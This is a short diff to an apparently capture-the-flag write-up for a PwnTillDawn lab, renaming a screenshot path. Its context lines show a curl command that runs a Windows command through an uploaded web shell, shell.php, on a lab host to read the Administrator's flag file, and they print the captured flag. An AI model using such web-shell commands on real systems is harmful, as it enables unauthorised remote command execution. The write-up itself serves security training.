@@ -96,7 +96,7 @@ Flag Content:
 ``` bash
 curl "http://10.150.150.11/upload/2/shell.php?cmd=type%20C:\Users\Administrator\Desktop\FLAG1.txt"
 ```
-![Nmap Scan Results](screenshots/ouptut-flag-output.png)
+![Nmap Scan Results](screenshots/flag-output.png)
 
 FLAG: PwnTillDawnAcademyIsAwesome!!!
 
